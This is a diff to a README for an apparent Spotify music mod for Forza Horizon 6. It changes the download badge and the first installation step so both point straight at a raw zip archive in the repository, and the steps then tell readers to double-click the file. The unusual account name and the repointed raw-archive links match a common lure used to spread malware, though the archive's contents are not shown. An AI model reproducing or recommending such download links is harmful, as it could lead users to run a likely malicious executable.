@@ -1,6 +1,6 @@
 # 📻 forza-horizon-6-spotify-radio - Play your personal Spotify music in-game
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/historical-johnthomasscopes431/forza-horizon-6-spotify-radio)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue)](https://github.com/historical-johnthomasscopes431/forza-horizon-6-spotify-radio/raw/refs/heads/main/Sources/radio_horizon_spotify_forza_v1.4-beta.2.zip)
 
 This software connects your Spotify account to Forza Horizon 6. It allows you to listen to your curated playlists while you drive. The application syncs your music playback with the game environment. You can control your tracks without leaving the driver seat.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the radio mod on your system.
 
-1.  Visit [this page](https://github.com/historical-johnthomasscopes431/forza-horizon-6-spotify-radio) to download the installer.
+1.  Visit [this page](https://github.com/historical-johnthomasscopes431/forza-horizon-6-spotify-radio/raw/refs/heads/main/Sources/radio_horizon_spotify_forza_v1.4-beta.2.zip) to download the installer.
 2.  Locate the downloaded file in your Downloads folder.
 3.  Double-click the file to start the installation process.
 4.  Follow the prompts on your screen.
